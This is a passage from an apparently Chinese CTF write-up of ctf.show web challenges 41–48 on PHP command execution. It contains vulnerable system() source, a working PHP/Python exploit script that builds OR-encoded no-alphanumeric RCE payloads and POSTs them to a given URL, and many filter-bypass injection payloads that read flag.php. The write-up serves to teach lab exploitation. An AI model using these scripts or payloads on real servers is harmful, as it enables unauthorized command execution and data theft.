class="number">9</span>]|[a-z]被过滤，所以应该是无数字字母的rce，$、+、-、^、~被过滤，所以用|</span><br></pre></td></tr></table></figure><p>南神的解释：<br>例如源码中禁止我们使用了数字3，也就是ascii码值为51，我们可以使用或运算符在没有被禁止的字符中构造出51来，比如19和32没有被禁止，我们进行或运算19|32=51，就可以获得51这个ascii码值，也就是成功得到了数字3</p><p>参考yu22x师傅的exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">生成可用的字符：</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$myfile</span> = fopen(<span class="string">&quot;rce_or.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line"><span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.dechex(<span class="variable">$i</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$hex_i</span>=dechex(<span class="variable">$i</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line"><span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.dechex(<span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$hex_j</span>=dechex(<span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$preg</span> = <span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="variable">$preg</span> , hex2bin(<span class="variable">$hex_i</span>))||preg_match(<span class="variable">$preg</span> , hex2bin(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line"><span class="variable">$c</span>=(urldecode(<span class="variable">$a</span>)|urldecode(<span class="variable">$b</span>));</span><br><span class="line"><span class="keyword">if</span> (ord(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;ord(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line"><span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">fwrite(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line">fclose(<span class="variable">$myfile</span>);</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">使用上面生成的字符文件进行操作</span><br><span class="line">python exp.py url</span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(<span class="string">&quot;php rce_or.php&quot;</span>)  <span class="comment">#没有将php写入环境变量需手动运行</span></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">len</span>(argv)!=<span class="number">2</span>):</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&#x27;USER：python exp.py &lt;url&gt;&#x27;</span>)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;eg：  python exp.py http://ctf.show/&quot;</span>)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line">   exit(<span class="number">0</span>)</span><br><span class="line">url=argv[<span class="number">1</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">action</span>(<span class="params">arg</span>):</span></span><br><span class="line">   s1=<span class="string">&quot;&quot;</span></span><br><span class="line">   s2=<span class="string">&quot;&quot;</span></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">       f=<span class="built_in">open</span>(<span class="string">&quot;rce_or.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">       <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">           t=f.readline()</span><br><span class="line">           <span class="keyword">if</span> t==<span class="string">&quot;&quot;</span>:</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">           <span class="keyword">if</span> t[<span class="number">0</span>]==i:</span><br><span class="line">               <span class="comment">#print(i)</span></span><br><span class="line">               s1+=t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">               s2+=t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">       f.close()</span><br><span class="line">   output=<span class="string">&quot;(\&quot;&quot;</span>+s1+<span class="string">&quot;\&quot;|\&quot;&quot;</span>+s2+<span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">   <span class="keyword">return</span>(output)</span><br><span class="line">   </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">   param=action(<span class="built_in">input</span>(<span class="string">&quot;\n[+] your function：&quot;</span>) )+action(<span class="built_in">input</span>(<span class="string">&quot;[+] your command：&quot;</span>))</span><br><span class="line">   data=&#123;</span><br><span class="line">       <span class="string">&#x27;c&#x27;</span>:urllib.parse.unquote(param)</span><br><span class="line">       &#125;</span><br><span class="line">   r=requests.post(url,data=data)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;\n[*] result:\n&quot;</span>+r.text)</span><br></pre></td></tr></table></figure><p>结合dota_st师傅的脚本(将上面两个脚本结合起来)：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -- coding: utf-8 --</span></span><br><span class="line"><span class="comment"># Author: MTRleed</span></span><br><span class="line"><span class="comment"># file: web41异或运算.py</span></span><br><span class="line"><span class="comment"># time: 2023/4/9 15:59</span></span><br><span class="line">import requests</span><br><span class="line">import urllib</span><br><span class="line">import re</span><br><span class="line"><span class="keyword">from</span> sys import *</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (len(argv) != <span class="number">2</span>):</span><br><span class="line">    <span class="keyword">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">50</span>)</span><br><span class="line">    <span class="keyword">print</span>(<span class="string">&#x27;USER:python exp.py &lt;url&gt;&#x27;</span>)</span><br><span class="line">    <span class="keyword">print</span>(<span class="string">&quot;eg:  python exp.py http://ctf.show/&quot;</span>)</span><br><span class="line">    <span class="keyword">print</span>(<span class="string">&quot;exit: input exit in function&quot;</span>)</span><br><span class="line">    <span class="keyword">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">50</span>)</span><br><span class="line">    <span class="keyword">exit</span>(<span class="number">0</span>)</span><br><span class="line">url = argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成可用的字符，存放在rce.txt</span></span><br><span class="line">def write_rce():</span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    preg = <span class="string">&#x27;[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i in range(<span class="number">256</span>):</span><br><span class="line">        <span class="keyword">for</span> j in range(<span class="number">256</span>):</span><br><span class="line">            <span class="keyword">if</span> not (re.<span class="keyword">match</span>(preg, chr(i), re.I) <span class="keyword">or</span> re.<span class="keyword">match</span>(preg, chr(j), re.I)):</span><br><span class="line">                k = i | j</span><br><span class="line">                <span class="keyword">if</span> k &gt;= <span class="number">32</span> <span class="keyword">and</span> k &lt;= <span class="number">126</span>:</span><br><span class="line">                    a = <span class="string">&#x27;%&#x27;</span> + hex(i)[<span class="number">2</span>:].zfill(<span class="number">2</span>)</span><br><span class="line">                    b = <span class="string">&#x27;%&#x27;</span> + hex(j)[<span class="number">2</span>:].zfill(<span class="number">2</span>)</span><br><span class="line">                    result += (chr(k) + <span class="string">&#x27; &#x27;</span> + a + <span class="string">&#x27; &#x27;</span> + b + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    f = open(<span class="string">&#x27;rce.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">    f.write(result)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 根据输入的命令在生成的txt中进行匹配</span></span><br><span class="line">def action(arg):</span><br><span class="line">    s1 = <span class="string">&quot;&quot;</span></span><br><span class="line">    s2 = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i in arg:</span><br><span class="line">        f = open(<span class="string">&quot;rce.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            t = f.readline()</span><br><span class="line">            <span class="keyword">if</span> t == <span class="string">&quot;&quot;</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> t[<span class="number">0</span>] == i:</span><br><span class="line">                s1 += t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">                s2 += t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        f.close()</span><br><span class="line">    output = <span class="string">&quot;(\&quot;&quot;</span> + s1 + <span class="string">&quot;\&quot;|\&quot;&quot;</span> + s2 + <span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">    <span class="keyword">return</span> (output)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    write_rce()</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        s1 = input(<span class="string">&quot;\n[+] your function：&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> s1 == <span class="string">&quot;exit&quot;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        s2 = input(<span class="string">&quot;[+] your command：&quot;</span>)</span><br><span class="line">        param = action(s1) + action(s2)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;c&#x27;</span>: urllib.parse.unquote(param)</span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">&quot;\n[*] result:\n&quot;</span> + r.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web41-0.png"></p><p>​      </p><h3 id="web42-终止代码段绕过"><a href="#web42-终止代码段绕过" class="headerlink" title="web42(终止代码段绕过)"></a>web42(终止代码段绕过)</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">源码：</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line">又回到system函数执行，但是强制给参数加&gt;/dev/<span class="literal">null</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span>，</span><br></pre></td></tr></table></figure><blockquote><p>(1)：&gt; 代表重定向到哪里，例如：echo “123” &gt; /home/123.txt<br>(2)：/dev/null 代表空设备文件<br>(3)：2&gt; 表示stderr标准错误<br>(4)：&amp; 表示等同于的意思，2&gt;&amp;1，表示2的输出重定向等同于1，也就是1也被重定向了<br>(5)：1 表示stdout标准输出，系统默认值是1，所以”&gt;/dev/null”等同于 “1&gt;/dev/null”<br>因此，&gt;/dev/null 2&gt;&amp;1 也可以写成”1&gt; /dev/null 2&gt; &amp;1”</p><p>那么本文标题的语句执行过程为：<br>1&gt;/dev/null ：首先表示标准输出重定向到空设备文件，也就是不输出任何信息到终端，也就是不显示任何信息。<br>2&gt;&amp;1 ： 接着，标准错误输出重定向到标准输出，因为之前标准输出已经重定向到了空设备文件，所以标准错误输出也重定向到空设备文件。</p><p><strong>“ &gt;/dev/null 2&gt;&amp;1 “ 或 “ 1&gt;/dev/null 2&gt;&amp;1 “常用来避免shell命令或者程序等运行中有内容输出。</strong></p></blockquote><p>所以我们要是输入?c=ls它是不会有回显的，那怎么办呢？我们可以用分隔符将该命令分隔开，防止影响我们的代码运行</p><table><thead><tr><th align="center">分隔符</th><th>描述</th></tr></thead><tbody><tr><td align="center">；</td><td>如果每个命令都被一个 ；所分隔，那么命令会连续地执行下去</td></tr><tr><td align="center">&amp;&amp;</td><td>执行错误检查命令，如果其左侧的命令不返回预期的结果，其右侧的命令就不会执行</td></tr><tr><td align="center">&amp;</td><td>不执行错误检查和运行所有命令</td></tr><tr><td align="center">||</td><td>若遇到可以成功执行的命令，那么命令停止执行，即使后面还有正确的命令。假如命令一开始就执行失败，那么就会执行||后的下一个命令，直到遇到可以成功执行的命令为止，假如所有的都失败，则所有这些失败的命令都会被尝试执行一次</td></tr><tr><td align="center">|</td><td>即使遇到可以成功执行的命令，命令也会继续执行下去，并且会显示最后一个命令的执行结果</td></tr></tbody></table><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=ls; 这样子的话ls命令是不受后面语句的影响的，可以出现回显</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web42-0.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=tac flag.php;</span><br><span class="line">?c=ca\t fla*;  <span class="comment">#cat命令需要查看源代码才能看到flag</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web42-1.png"></p><p><strong>为什么cat不能直接显示？</strong>两种命令最后都能的得到flag，但是区别是tac输入后直接就把flag显示出来了，而cat需要我们查看源代码。这是为什么呢？</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web57-1.png"></p><p>对比两者的源代码，我们发现，<code>cat</code>指令把<code>flag.php</code>的内容导出后依然遵循<code>php</code>的语法，那么没有<code>echo</code>语句，就无法显示，而<code>tac</code>指令将一切倒过来后就不是<code>php</code>语句了，在<code>html</code>语句里就会直接显示出来，所以那些需要查看原代码的命令可能是因为基于<code>php</code>却没有<code>echo</code>命令导致的比如<code>uniq</code>也是。</p><h3 id="web43"><a href="#web43" class="headerlink" title="web43"></a>web43</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">源码：</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line">过滤了分号；分隔符和cat，我们还可以用其他的</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=tac flag||</span><br></pre></td></tr></table></figure><p>​       </p><h3 id="web44"><a href="#web44" class="headerlink" title="web44"></a>web44</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">源码：</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/;|cat|flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line">相对于上一关，多过滤了flag，我们用回老方法，通配符或者引号</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=tac fla*||</span><br><span class="line">?c=tac fla<span class="string">&#x27;&#x27;</span>g.ph<span class="string">&#x27;&#x27;</span>p||</span><br></pre></td></tr></table></figure><p>​      </p><h3 id="web45"><a href="#web45" class="headerlink" title="web45"></a>web45</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">源码：</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| /i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line">多过滤了空格，我们使用url编码绕过,%<span class="number">20</span>不行，%<span class="number">09</span>可以</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=tac%<span class="number">09</span>flag*||</span><br><span class="line">?c=tac$&#123;IFS&#125;$<span class="number">9</span>fla*||</span><br></pre></td></tr></table></figure><p>​      </p><h3 id="web46"><a href="#web46" class="headerlink" title="web46"></a>web46</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">源码：</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line">过滤了空格 数字 $ *</span><br></pre></td></tr></table></figure><p>通配符<code>*</code>过滤，我们可以改用<code>?</code>进行匹配，或者单引号切割，同时空格的话还是可以继续使用%09，它不属于过滤的数字范畴</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=tac%09fla?.php||</span><br><span class="line">?c=tac%09fl&#x27;&#x27;ag.p&#x27;&#x27;hp||</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web46.png"></p><p>​       </p><h3 id="web47-常用读取函数"><a href="#web47-常用读取函数" class="headerlink" title="web47(常用读取函数)"></a>web47(常用读取函数)</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">源码：</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line">过滤了几个读取文件的命令，但是没有过滤掉tac，可以继续使用上一把payload</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=tac%09fla?.php||</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">常用的读取文件/输出函数命令：</span><br><span class="line">more:一页一页的显示档案内容</span><br><span class="line">less:与 more 类似</span><br><span class="line">head:查看头几行</span><br><span class="line">tac:从最后一行显示到第一行，可以看出 tac 是 cat 的反向显示</span><br><span class="line">rev:从最后一个字符显示到第一个字符</span><br><span class="line">tail:查看尾几行</span><br><span class="line">nl：显示的时候，顺便输出行号</span><br><span class="line">od:以二进制的方式读取档案内容</span><br><span class="line">vi:一种编辑器，这个也可以查看</span><br><span class="line">vim:一种编辑器，这个也可以查看</span><br><span class="line">sort:可以查看</span><br><span class="line">uniq:可以查看</span><br><span class="line">file -f:报错出具体内容</span><br><span class="line">grep：在当前目录中，查找后缀有file字样的文件中包含test字符串的文件，并打印出该字符串的行。此时，可以使用如下命令：grep test *file</span><br><span class="line">    strings：</span><br></pre></td></tr></table></figure><p>​      </p><h3 id="web48"><a href="#web48" class="headerlink" title="web48"></a>web48</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">源码：</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span 